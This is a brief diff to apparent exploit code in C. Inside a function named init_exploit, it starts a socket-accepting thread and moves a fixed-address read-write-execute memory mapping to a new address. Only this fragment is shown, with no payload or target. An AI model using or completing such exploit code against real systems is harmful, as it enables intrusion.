@@ -888,7 +888,7 @@ void init_exploit() {
     printf("accepting socket\n");
 	pthread_create(&th1, NULL, accept_socket, NULL);
 
-	addr = (unsigned long)mmap((void *)0x20000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
+	addr = (unsigned long)mmap((void *)0x70000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
     addr += 0x800;
 	MAGIC = addr;
 	//179change
